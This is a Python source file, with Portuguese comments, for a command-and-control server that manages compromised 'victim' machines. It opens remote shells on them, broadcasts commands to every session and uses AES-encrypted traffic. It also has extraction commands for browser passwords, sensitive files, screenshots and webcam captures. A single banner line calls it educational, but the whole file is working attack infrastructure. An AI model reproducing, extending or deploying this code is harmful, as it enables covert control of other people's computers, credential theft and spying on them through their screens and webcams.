#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import json
import os
import sys
import time
import random
import base64
import select
import argparse
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import hashlib

# Verifica se as dependências estão instaladas
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.text import Text
    from rich.prompt import Prompt
    from rich.table import Table
    from rich.progress import Progress
    from rich.layout import Layout
    from rich.live import Live
    from rich.box import ROUNDED
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("Instale a biblioteca rich: pip install rich")
    sys.exit(1)

# Configuração do console
console = Console()

class EncryptionHandler:
    def __init__(self, key=None):
        if key:
            self.key = hashlib.sha256(key.encode()).digest()
        else:
            self.key = None
    
    def encrypt(self, data):
        if not self.key:
            return data
            
        iv = get_random_bytes(16)
        cipher = AES.new(self.key, AES.MODE_CFB, iv)
        encrypted = cipher.encrypt(data.encode())
        return base64.b64encode(iv + encrypted).decode()
    
    def decrypt(self, data):
        if not self.key:
            return data
            
        try:
            raw = base64.b64decode(data)
            iv = raw[:16]
            cipher = AES.new(self.key, AES.MODE_CFB, iv)
            return cipher.decrypt(raw[16:]).decode()
        except:
            return data

class C2Server:
    def __init__(self, host="0.0.0.0", port=4444, encryption_key=None):
        self.host = host
        self.port = port
        self.clients = {}
        self.sessions = {}
        self.next_session_id = 1
        self.running = False
        self.server_socket = None
        self.encryption = EncryptionHandler(encryption_key)
        self.command_history = []
        self.max_history = 100
        self.mode = "server"  # server or client
        
    def display_banner(self):
        banner = """
██████╗ ██████╗ 
██╔══██╗╚════██╗
██████╔╝ █████╔╝
██╔══██╗██╔═══╝ 
██████╔╝███████╗
╚═════╝ ╚══════╝
COMMAND & CONTROL SERVER v4.0
"""
        console.print(Panel.fit(
            f"[bold red]{banner}[/bold red]",
            title="[bold white on red] C2 SERVER [/bold white on red]",
            border_style="red",
            padding=(1, 2)
        ))
        
        console.print(Panel.fit(
            f"[yellow]⚠️  SERVIDOR: {self.host}:{self.port} - USE APENAS PARA FINS EDUCACIONAIS! ⚠️[/yellow]",
            border_style="yellow"
        ))
        
    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.running = True
            console.print(f"[green]✓ Servidor C2 iniciado em {self.host}:{self.port}[/green]")
            
            if self.encryption.key:
                console.print("[green]✓ Criptografia ativada[/green]")
            
            # Thread para aceitar conexões
            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            # Thread para verificar conexões inativas
            cleanup_thread = threading.Thread(target=self.cleanup_inactive_clients)
            cleanup_thread.daemon = True
            cleanup_thread.start()
            
            return True
        except Exception as e:
            console.print(f"[red]✗ Erro ao iniciar servidor: {e}[/red]")
            return False

    def connect_to_victim(self, target_host, target_port):
        """Conecta a uma vítima como cliente"""
        try:
            self.mode = "client"
            console.print(f"[yellow]Tentando conectar a {target_host}:{target_port}...[/yellow]")
            
            victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            victim_socket.connect((target_host, target_port))
            
            # Gerar ID de sessão
            session_id = self.next_session_id
            self.next_session_id += 1
            
            # Adicionar à lista de clientes (como se fosse uma vítima)
            self.clients[session_id] = {
                'socket': victim_socket,
                'address': (target_host, target_port),
                'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'last_seen': datetime.now(),
                'last_active': datetime.now(),
                'info': 'Vítima conectada',
                'buffer': b'',
                'active': True,
                'os': 'Desconhecido',
                'username': 'Desconhecido',
                'is_victim': True
            }
            
            self.sessions[session_id] = victim_socket
            
            console.print(f"[green]✓ Conectado a {target_host}:{target_port} (Sessão: {session_id})[/green]")
            
            # Thread para lidar com a vítima
            victim_thread = threading.Thread(
                target=self.handle_victim, 
                args=(victim_socket, (target_host, target_port), session_id)
            )
            victim_thread.daemon = True
            victim_thread.start()
            
            return session_id
            
        except Exception as e:
            console.print(f"[red]✗ Erro ao conectar à vítima: {e}[/red]")
            return None
    
    def handle_victim(self, victim_socket, victim_address, session_id):
        """Lida com a comunicação com uma vítima conectada"""
        try:
            while self.running:
                # Receber dados da vítima
                data = self.receive_data(victim_socket, 0.5)
                if data is None:
                    continue
                if not data:
                    break
                    
                # Adicionar ao buffer da vítima
                if session_id in self.clients:
                    self.clients[session_id]['buffer'] += data
                    self.clients[session_id]['last_seen'] = datetime.now()
                    self.clients[session_id]['last_active'] = datetime.now()
                    
                # Processar informações da vítima
                try:
                    # Tentar descriptografar se necessário
                    try:
                        decoded_data = data.decode('utf-8', errors='ignore')
                        if self.encryption.key:
                            decoded_data = self.encryption.decrypt(decoded_data)
                    except:
                        decoded_data = data.decode('utf-8', errors='ignore')
                    
                    # Processar diferentes tipos de mensagens
                    if decoded_data.startswith("INFO:"):
                        info = decoded_data[5:]
                        if session_id in self.clients:
                            self.clients[session_id]['info'] = info
                        console.print(f"[cyan]ℹ️  Info da sessão {session_id}: {info}[/cyan]")
                    
                    elif decoded_data.startswith("OS:"):
                        os_info = decoded_data[3:]
                        if session_id in self.clients:
                            self.clients[session_id]['os'] = os_info
                    
                    elif decoded_data.startswith("USER:"):
                        user_info = decoded_data[5:]
                        if session_id in self.clients:
                            self.clients[session_id]['username'] = user_info
                    
                    # Se for resposta de comando, exibir
                    elif decoded_data.startswith("RESULT:"):
                        result = decoded_data[7:]
                        console.print(f"[blue][Sessão {session_id}][/blue] [green]Resultado:[/green]\n{result}")
                    
                    # Heartbeat
                    elif decoded_data == "PING":
                        if session_id in self.clients:
                            self.send_data(session_id, "PONG")
                    
                except Exception as e:
                    console.print(f"[yellow]⚠️  Erro ao processar dados: {e}[/yellow]")
                    
        except Exception as e:
            console.print(f"[red]✗ Erro na sessão {session_id}: {e}[/red]")
        finally:
            self.remove_client(session_id)
        
    def accept_connections(self):
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()
                
                # Gerar ID de sessão
                session_id = self.next_session_id
                self.next_session_id += 1
                
                # Adicionar à lista de clientes
                self.clients[session_id] = {
                    'socket': client_socket,
                    'address': client_address,
                    'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'last_seen': datetime.now(),
                    'last_active': datetime.now(),
                    'info': 'Desconhecido',
                    'buffer': b'',
                    'active': True,
                    'os': 'Desconhecido',
                    'username': 'Desconhecido',
                    'is_victim': False
                }
                
                self.sessions[session_id] = client_socket
                
                console.print(f"[green]✓ Nova conexão de {client_address[0]}:{client_address[1]} (Sessão: {session_id})[/green]")
                
                # Thread para lidar com o cliente
                client_thread = threading.Thread(
                    target=self.handle_client, 
                    args=(client_socket, client_address, session_id)
                )
                client_thread.daemon = True
                client_thread.start()
                
            except Exception as e:
                if self.running:
                    console.print(f"[red]✗ Erro ao aceitar conexão: {e}[/red]")
    
    def cleanup_inactive_clients(self):
        """Remove clientes inativos após 5 minutos"""
        while self.running:
            time.sleep(30)  # Verificar a cada 30 segundos
            now = datetime.now()
            to_remove = []
            
            for session_id, client in list(self.clients.items()):
                if (now - client['last_active']).total_seconds() > 300:  # 5 minutos
                    to_remove.append(session_id)
            
            for session_id in to_remove:
                console.print(f"[yellow]Removendo cliente inativo (Sessão: {session_id})[/yellow]")
                self.remove_client(session_id)
    
    def receive_data(self, sock, timeout=1):
        """Recebe dados do socket com timeout"""
        ready = select.select([sock], [], [], timeout)
        if ready[0]:
            try:
                data = sock.recv(65536)  # Aumentado para 64KB
                return data
            except:
                return None
        return None
    
    def handle_client(self, client_socket, client_address, session_id):
        try:
            while self.running:
                # Receber dados do cliente
                data = self.receive_data(client_socket, 0.5)
                if data is None:
                    continue
                if not data:
                    break
                    
                # Adicionar ao buffer do cliente
                if session_id in self.clients:
                    self.clients[session_id]['buffer'] += data
                    self.clients[session_id]['last_seen'] = datetime.now()
                    self.clients[session_id]['last_active'] = datetime.now()
                    
                # Processar informações do cliente
                try:
                    # Tentar descriptografar se necessário
                    try:
                        decoded_data = data.decode('utf-8', errors='ignore')
                        if self.encryption.key:
                            decoded_data = self.encryption.decrypt(decoded_data)
                    except:
                        decoded_data = data.decode('utf-8', errors='ignore')
                    
                    # Processar diferentes tipos de mensagens
                    if decoded_data.startswith("INFO:"):
                        info = decoded_data[5:]
                        if session_id in self.clients:
                            self.clients[session_id]['info'] = info
                        console.print(f"[cyan]ℹ️  Info da sessão {session_id}: {info}[/cyan]")
                    
                    elif decoded_data.startswith("OS:"):
                        os_info = decoded_data[3:]
                        if session_id in self.clients:
                            self.clients[session_id]['os'] = os_info
                    
                    elif decoded_data.startswith("USER:"):
                        user_info = decoded_data[5:]
                        if session_id in self.clients:
                            self.clients[session_id]['username'] = user_info
                    
                    # Se for resposta de comando, exibir
                    elif decoded_data.startswith("RESULT:"):
                        result = decoded_data[7:]
                        console.print(f"[blue][Sessão {session_id}][/blue] [green]Resultado:[/green]\n{result}")
                    
                    # Heartbeat
                    elif decoded_data == "PING":
                        if session_id in self.clients:
                            self.send_data(session_id, "PONG")
                    
                except Exception as e:
                    console.print(f"[yellow]⚠️  Erro ao processar dados: {e}[/yellow]")
                    
        except Exception as e:
            console.print(f"[red]✗ Erro na sessão {session_id}: {e}[/red]")
        finally:
            self.remove_client(session_id)
    
    def send_data(self, session_id, data):
        """Envia dados para um cliente específico"""
        if session_id not in self.sessions:
            return False
            
        try:
            # Criptografar se necessário
            if self.encryption.key:
                data = self.encryption.encrypt(data)
            else:
                data = data.encode('utf-8')
                
            self.sessions[session_id].send(data)
            return True
        except Exception as e:
            console.print(f"[red]✗ Erro ao enviar dados: {e}[/red]")
            self.remove_client(session_id)
            return False
    
    def remove_client(self, session_id):
        if session_id in self.clients:
            client_info = self.clients[session_id]
            console.print(f"[yellow]✗ Conexão fechada: Sessão {session_id} ({client_info['address'][0]})[/yellow]")
            
            try:
                client_info['socket'].close()
            except:
                pass
            
            del self.clients[session_id]
            if session_id in self.sessions:
                del self.sessions[session_id]
    
    def send_command(self, session_id, command):
        if session_id not in self.sessions:
            console.print(f"[red]✗ Sessão {session_id} não encontrada[/red]")
            return False
            
        try:
            # Adicionar ao histórico
            self.command_history.append({
                'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'session': session_id,
                'command': command
            })
            # Manter apenas os últimos max_history comandos
            if len(self.command_history) > self.max_history:
                self.command_history.pop(0)
                
            # Formatar comando para o cliente entender
            return self.send_data(session_id, f"CMD:{command}\n")
        except Exception as e:
            console.print(f"[red]✗ Erro ao enviar comando: {e}[/red]")
            self.remove_client(session_id)
            return False
    
    def list_clients(self, detailed=False):
        if not self.clients:
            console.print("[yellow]Nenhum cliente conectado[/yellow]")
            return
            
        table = Table(title="Clientes Conectados", show_header=True, header_style="bold magenta", box=ROUNDED)
        table.add_column("Sessão", style="cyan", no_wrap=True)
        table.add_column("Endereço", style="green")
        table.add_column("Usuário", style="yellow")
        table.add_column("Sistema")
        table.add_column("Conectado em", no_wrap=True)
        table.add_column("Última atividade", no_wrap=True)
        table.add_column("Tipo")
        
        if detailed:
            table.add_column("Info")
        
        for session_id, client in self.clients.items():
            last_active = (datetime.now() - client['last_active']).total_seconds()
            last_active_str = f"{int(last_active)}s" if last_active < 60 else f"{int(last_active/60)}min"
            
            client_type = "Vítima" if client.get('is_victim', False) else "Cliente"
            
            row_data = [
                str(session_id),
                f"{client['address'][0]}:{client['address'][1]}",
                client['username'],
                client['os'],
                client['connected_at'],
                last_active_str,
                client_type
            ]
            
            if detailed:
                row_data.append(client['info'])
            
            table.add_row(*row_data)
            
        console.print(table)
    
    def show_command_history(self, limit=10):
        if not self.command_history:
            console.print("[yellow]Nenhum comando no histórico[/yellow]")
            return
            
        table = Table(title=f"Últimos {limit} Comandos", show_header=True, header_style="bold blue")
        table.add_column("Hora", style="cyan", no_wrap=True)
        table.add_column("Sessão")
        table.add_column("Comando", style="green")
        
        for cmd in self.command_history[-limit:]:
            table.add_row(cmd['time'], str(cmd['session']), cmd['command'])
            
        console.print(table)
    
    def interactive_shell(self, session_id):
        if session_id not in self.sessions:
            console.print(f"[red]✗ Sessão {session_id} não encontrada[/red]")
            return
            
        client_ip = self.clients[session_id]['address'][0]
        console.print(f"[green]Iniciando shell interativo com sessão {session_id}[/green]")
        console.print("[yellow]Digite 'exit' para sair do shell, 'clear' para limpar a tela[/yellow]")
        
        # Limpar buffer anterior
        if session_id in self.clients:
            self.clients[session_id]['buffer'] = b''
        
        while True:
            try:
                # Prompt personalizado com cores
                command = Prompt.ask(f"[bold red]c2[/bold red][bold blue] {client_ip}[/bold blue] [bold yellow]>>[/bold yellow] ")
                
                if command.lower() in ['exit', 'quit']:
                    break
                    
                if command.lower() == 'clear':
                    console.clear()
                    continue
                    
                if not command.strip():
                    continue
                    
                # Comandos especiais para extração de dados
                if command.lower() == 'screenshot':
                    console.print("[yellow]Solicitando screenshot...[/yellow]")
                    command = "screenshot_capture"
                elif command.lower() == 'webcam':
                    console.print("[yellow]Solicitando captura de webcam...[/yellow]")
                    command = "webcam_capture"
                elif command.lower() == 'record screen':
                    console.print("[yellow]Solicitando gravação de tela...[/yellow]")
                    command = "record_screen 10"  # 10 segundos
                    
                # Enviar comando
                if not self.send_command(session_id, command):
                    break
                
                # Aguardar resposta
                start_time = time.time()
                response_received = False
                response_data = ""
                
                while time.time() - start_time < 30:  # Timeout de 30 segundos
                    if session_id in self.clients and self.clients[session_id]['buffer']:
                        # Verificar se há resposta no buffer
                        buffer = self.clients[session_id]['buffer']
                        
                        try:
                            # Tentar descriptografar
                            decoded_buffer = buffer.decode('utf-8', errors='ignore')
                            if self.encryption.key:
                                decoded_buffer = self.encryption.decrypt(decoded_buffer)
                                
                            if "RESULT:" in decoded_buffer:
                                # Extrair a resposta
                                parts = decoded_buffer.split("RESULT:", 1)
                                if len(parts) > 1:
                                    result = parts[1]
                                    console.print(f"[green]Resposta:[/green]\n{result}")
                                    # Limpar buffer processado
                                    self.clients[session_id]['buffer'] = b''
                                    response_received = True
                                    break
                        except:
                            # Fallback para processamento binário
                            if b"RESULT:" in buffer:
                                parts = buffer.split(b"RESULT:", 1)
                                if len(parts) > 1:
                                    result = parts[1].decode('utf-8', errors='ignore')
                                    console.print(f"[green]Resposta:[/green]\n{result}")
                                    self.clients[session_id]['buffer'] = b''
                                    response_received = True
                                    break
                    
                    time.sleep(0.1)
                
                if not response_received:
                    console.print("[red]Nenhuma resposta recebida dentro do tempo limite[/red]")
                    # Limpar buffer para evitar processamento incorreto posterior
                    if session_id in self.clients:
                        self.clients[session_id]['buffer'] = b''
                    
            except KeyboardInterrupt:
                console.print("\n[yellow]Shell interrompido[/yellow]")
                break
            except Exception as e:
                console.print(f"[red]Erro no shell: {e}[/red]")
                break
    
    def extract_data(self, session_id, data_type):
        """Extrai dados específicos da vítima"""
        if session_id not in self.sessions:
            console.print(f"[red]✗ Sessão {session_id} não encontrada[/red]")
            return False
            
        commands = {
            'browser_passwords': 'extract_browser_passwords',
            'system_info': 'get_system_info',
            'network_info': 'get_network_info',
            'files': 'list_sensitive_files',
            'screenshot': 'screenshot_capture',
            'webcam': 'webcam_capture'
        }
        
        if data_type not in commands:
            console.print(f"[red]Tipo de dados inválido: {data_type}[/red]")
            console.print(f"[yellow]Tipos disponíveis: {', '.join(commands.keys())}[/yellow]")
            return False
        
        console.print(f"[yellow]Extraindo {data_type} da sessão {session_id}...[/yellow]")
        return self.send_command(session_id, commands[data_type])
    
    def show_help(self):
        help_text = """
Comandos disponíveis:
- sessions [-d]         - Listar sessões ativas (-d para detalhes)
- shell [id]            - Iniciar shell interativo com a sessão
- exec [id] [comando]   - Executar comando único
- extract [id] [tipo]   - Extrair dados da vítima
- info [id]             - Mostrar informações detalhadas da sessão
- kill [id]             - Encerrar sessão
- broadcast [comando]   - Enviar comando para todas as sessões
- history [n]           - Mostrar histórico de comandos (opcional: n últimos)
- config                - Mostrar configuração do servidor
- set host [ip]         - Alterar endereço de escuta
- set port [porta]      - Alterar porta de escuta
- set key [chave]       - Definir chave de criptografia
- connect [ip] [porta]  - Conectar a uma vítima
- listen                - Modo servidor (receber conexões)
- clear                 - Limpar a tela
- help                  - Mostrar esta ajuda
- exit                  - Sair do C2

Tipos de dados para extração:
- browser_passwords     - Senhas de navegadores
- system_info           - Informações do sistema
- network_info          - Informações de rede
- files                 - Listar arquivos sensíveis
- screenshot            - Capturar tela
- webcam                - Capturar webcam
"""
        console.print(Panel.fit(help_text, title="[bold]Ajuda[/bold]", border_style="blue"))
    
    def show_config(self):
        config_table = Table(title="Configuração do Servidor", show_header=False, box=ROUNDED)
        config_table.add_row("Host", self.host)
        config_table.add_row("Porta", str(self.port))
        config_table.add_row("Modo", self.mode)
        config_table.add_row("Criptografia", "Ativada" if self.encryption.key else "Desativada")
        config_table.add_row("Clientes conectados", str(len(self.clients)))
        console.print(config_table)
    
    def exec_command(self, session_id, command):
        """Executa um comando único e mostra o resultado"""
        if session_id not in self.sessions:
            console.print(f"[red]✗ Sessão {session_id} não encontrada[/red]")
            return False
            
        # Limpar buffer anterior
        if session_id in self.clients:
            self.clients[session_id]['buffer'] = b''
        
        # Enviar comando
        if not self.send_command(session_id, command):
            return False
        
        console.print(f"[yellow]Executando '{command}' na sessão {session_id}...[/yellow]")
        
        # Aguardar resposta
        start_time = time.time()
        response_received = False
        
        with Progress() as progress:
            task = progress.add_task("[yellow]Aguardando resposta...[/yellow]", total=30)
            
            while not response_received and time.time() - start_time < 30:
                progress.update(task, advance=1)
                time.sleep(1)
                
                if session_id in self.clients and self.clients[session_id]['buffer']:
                    buffer = self.clients[session_id]['buffer']
                    
                    try:
                        decoded_buffer = buffer.decode('utf-8', errors='ignore')
                        if self.encryption.key:
                            decoded_buffer = self.encryption.decrypt(decoded_buffer)
                            
                        if "RESULT:" in decoded_buffer:
                            parts = decoded_buffer.split("RESULT:", 1)
                            if len(parts) > 1:
                                result = parts[1]
                                console.print(Panel.fit(result, title=f"[bold]Resultado - Sessão {session_id}[/bold]"))
                                self.clients[session_id]['buffer'] = b''
                                response_received = True
                    except:
                        if b"RESULT:" in buffer:
                            parts = buffer.split(b"RESULT:", 1)
                            if len(parts) > 1:
                                result = parts[1].decode('utf-8', errors='ignore')
                                console.print(Panel.fit(result, title=f"[bold]Resultado - Sessão {session_id}[/bold]"))
                                self.clients[session_id]['buffer'] = b''
                                response_received = True
        
        if not response_received:
            console.print("[red]Nenhuma resposta recebida dentro do tempo limite[/red]")
            if session_id in self.clients:
                self.clients[session_id]['buffer'] = b''
        
        return response_received
    
    def change_host(self, new_host):
        """Altera o host do servidor"""
        if self.running:
            console.print("[red]Pare o servidor primeiro com 'exit' antes de mudar o host[/red]")
            return False
        
        self.host = new_host
        console.print(f"[green]Host alterado para: {new_host}[/green]")
        return True
    
    def change_port(self, new_port):
        """Altera a porta do servidor"""
        if self.running:
            console.print("[red]Pare o servidor primeiro com 'exit' antes de mudar a porta[/red]")
            return False
        
        try:
            self.port = int(new_port)
            console.print(f"[green]Porta alterada para: {new_port}[/green]")
            return True
        except ValueError:
            console.print("[red]Porta deve ser um número inteiro[/red]")
            return False
    
    def set_encryption_key(self, key):
        """Define uma nova chave de criptografia"""
        if self.running:
            console.print("[red]Pare o servidor primeiro com 'exit' antes de mudar a chave[/red]")
            return False
        
        self.encryption = EncryptionHandler(key)
        console.print("[green]Chave de criptografia definida[/green]")
        return True
    
    def run(self):
        self.display_banner()
        
        if not self.start_server():
            return
            
        console.print("[green]Digite 'help' para ver os comandos disponíveis[/green]")
        
        # Loop principal de comando
        while True:
            try:
                # Prompt personalizado baseado no modo
                if self.mode == "server":
                    prompt_text = "[bold red]c2[/bold red] > "
                else:
                    prompt_text = "[bold red]c2[/bold red][bold blue] (client mode)[/bold blue] > "
                
                command_input = Prompt.ask(prompt_text).strip()
                
                if not command_input:
                    continue
                    
                # Adicionar ao histórico de comandos do console
                self.command_history.append({
                    'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    'session': 'CONSOLE',
                    'command': command_input
                })
                if len(self.command_history) > self.max_history:
                    self.command_history.pop(0)
                    
                command = command_input.split()
                cmd = command[0].lower()
                args = command[1:]
                
                if cmd == "help":
                    self.show_help()
                    
                elif cmd == "clear":
                    console.clear()
                    self.display_banner()
                    
                elif cmd == "sessions" or cmd == "list":
                    detailed = "-d" in args or "--detailed" in args
                    self.list_clients(detailed)
                    
                elif cmd == "shell":
                    if not args:
                        console.print("[red]Uso: shell [id_sessão][/red]")
                    else:
                        try:
                            session_id = int(args[0])
                            self.interactive_shell(session_id)
                        except ValueError:
                            console.print("[red]ID de sessão deve ser um número[/red]")
                
                elif cmd == "exec":
                    if len(args) < 2:
                        console.print("[red]Uso: exec [id_sessão] [comando][/red]")
                    else:
                        try:
                            session_id = int(args[0])
                            command_str = " ".join(args[1:])
                            self.exec_command(session_id, command_str)
                        except ValueError:
                            console.print("[red]ID de sessão deve ser um número[/red]")
                
                elif cmd == "extract":
                    if len(args) < 2:
                        console.print("[red]Uso: extract [id_sessão] [tipo_dados][/red]")
                    else:
                        try:
                            session_id = int(args[0])
                            data_type = args[1]
                            self.extract_data(session_id, data_type)
                        except ValueError:
                            console.print("[red]ID de sessão deve ser um número[/red]")
                            
                elif cmd == "info":
                    if not args:
                        console.print("[red]Uso: info [id_sessão][/red]")
                    else:
                        try:
                            session_id = int(args[0])
                            if session_id in self.clients:
                                client = self.clients[session_id]
                                info_table = Table(title=f"Informações Detalhadas - Sessão {session_id}", show_header=False, box=ROUNDED)
                                info_table.add_row("Endereço", f"{client['address'][0]}:{client['address'][1]}")
                                info_table.add_row("Usuário", client['username'])
                                info_table.add_row("Sistema", client['os'])
                                info_table.add_row("Conectado em", client['connected_at'])
                                info_table.add_row("Última atividade", f"{(datetime.now() - client['last_active']).total_seconds():.0f} segundos atrás")
                                info_table.add_row("Tipo", "Vítima" if client.get('is_victim', False) else "Cliente")
                                info_table.add_row("Info", client['info'])
                                console.print(info_table)
                            else:
                                console.print(f"[red]Sessão {session_id} não encontrada[/red]")
                        except ValueError:
                            console.print("[red]ID de sessão deve ser um número[/red]")
                            
                elif cmd == "kill":
                    if not args:
                        console.print("[red]Uso: kill [id_sessão][/red]")
                    else:
                        try:
                            session_id = int(args[0])
                            if session_id in self.clients:
                                self.remove_client(session_id)
                                console.print(f"[green]Sessão {session_id} encerrada[/green]")
                            else:
                                console.print(f"[red]Sessão {session_id} não encontrada[/red]")
                        except ValueError:
                            console.print("[red]ID de sessão deve ser um número[/red]")
                            
                elif cmd == "broadcast":
                    if not args:
                        console.print("[red]Uso: broadcast [comando][/red]")
                    else:
                        command_str = " ".join(args)
                        successful = 0
                        for session_id in list(self.sessions.keys()):
                            if self.send_command(session_id, command_str):
                                successful += 1
                        console.print(f"[green]Comando enviado para {successful} sessões[/green]")
                        
                elif cmd == "history":
                    limit = 10
                    if args:
                        try:
                            limit = int(args[0])
                        except ValueError:
                            console.print("[red]O limite deve ser um número[/red]")
                    self.show_command_history(limit)
                    
                elif cmd == "config":
                    self.show_config()
                    
                elif cmd == "set":
                    if len(args) < 2:
                        console.print("[red]Uso: set [host|port|key] [valor][/red]")
                    else:
                        setting = args[0].lower()
                        value = " ".join(args[1:])
                        
                        if setting == "host":
                            self.change_host(value)
                        elif setting == "port":
                            self.change_port(value)
                        elif setting == "key":
                            self.set_encryption_key(value)
                        else:
                            console.print("[red]Configuração inválida. Use: host, port ou key[/red]")
                
                elif cmd == "connect":
                    if len(args) < 2:
                        console.print("[red]Uso: connect [ip] [porta][/red]")
                    else:
                        target_host = args[0]
                        try:
                            target_port = int(args[1])
                            self.connect_to_victim(target_host, target_port)
                        except ValueError:
                            console.print("[red]Porta deve ser um número[/red]")
                
                elif cmd == "listen":
                    self.mode = "server"
                    console.print("[green]Modo servidor ativado (recebendo conexões)[/green]")
                        
                elif cmd == "exit" or cmd == "quit":
                    console.print("[yellow]Encerrando servidor C2...[/yellow]")
                    self.running = False
                    if self.server_socket:
                        self.server_socket.close()
                    for session_id in list(self.sessions.keys()):
                        self.remove_client(session_id)
                    break
                    
                else:
                    console.print(f"[red]Comando não reconhecido: {cmd}[/red]")
                    
            except KeyboardInterrupt:
                console.print("\n[yellow]Use 'exit' para sair[/yellow]")
            except Exception as e:
                console.print(f"[red]Erro ao processar comando: {e}[/red]")

def main():
    parser = argparse.ArgumentParser(description='Servidor C2 Avançado')
    parser.add_argument('--host', default='0.0.0.0', help='Endereço de escuta do servidor')
    parser.add_argument('--port', type=int, default=4444, help='Porta de escuta do servidor')
    parser.add_argument('--key', help='Chave de criptografia para comunicação')
    parser.add_argument('--listen', action='store_true', help='Iniciar servidor automaticamente')
    parser.add_argument('--connect', help='Conectar a uma vítima (formato: ip:porta)')
    
    args = parser.parse_args()
    
    # Verificar se é root para portas baixas
    if os.geteuid() != 0 and args.port < 1024:
        console.print("[yellow]⚠️  Para usar portas abaixo de 1024, execute como root[/yellow]")
        return
    
    server = C2Server(host=args.host, port=args.port, encryption_key=args.key)
    
    # Conectar a uma vítima se especificado
    if args.connect:
        if ':' in args.connect:
            target_host, target_port = args.connect.split(':')
            try:
                target_port = int(target_port)
                server.connect_to_victim(target_host, target_port)
            except ValueError:
                console.print("[red]Porta deve ser um número[/red]")
                return
        else:
            console.print("[red]Formato inválido. Use: ip:porta[/red]")
            return
    
    if args.listen:
        server.run()
    else:
        server.display_banner()
        console.print("[green]Use 'help' para ver os comandos disponíveis[/green]")
        
        # Modo de configuração interativa antes de iniciar
        while True:
            try:
                cmd = Prompt.ask("[bold red]c2-config[/bold red] > ").strip().split()
                
                if not cmd:
                    continue
                    
                if cmd[0].lower() == "set":
                    if len(cmd) < 3:
                        console.print("[red]Uso: set [host|port|key] [valor][/red]")
                    else:
                        setting = cmd[1].lower()
                        value = " ".join(cmd[2:])
                        
                        if setting == "host":
                            server.change_host(value)
                        elif setting == "port":
                            server.change_port(value)
                        elif setting == "key":
                            server.set_encryption_key(value)
                        else:
                            console.print("[red]Configuração inválida. Use: host, port ou key[/red]")
                
                elif cmd[0].lower() == "config":
                    server.show_config()
                    
                elif cmd[0].lower() == "start":
                    server.run()
                    break
                    
                elif cmd[0].lower() in ["exit", "quit"]:
                    console.print("[yellow]Saindo...[/yellow]")
                    return
                    
                elif cmd[0].lower() == "help":
                    console.print("""
Comandos de configuração:
- set host [ip]        - Definir endereço de escuta
- set port [porta]     - Definir porta de escuta
- set key [chave]      - Definir chave de criptografia
- config               - Mostrar configuração atual
- start                - Iniciar servidor
- exit                 - Sair
""")
                else:
                    console.print("[red]Comando não reconhecido. Use 'help' para ajuda.[/red]")
                    
            except KeyboardInterrupt:
                console.print("\n[yellow]Use 'exit' para sair[/yellow]")
            except Exception as e:
                console.print(f"[red]Erro: {e}[/red]")

if __name__ == "__main__":
    main()
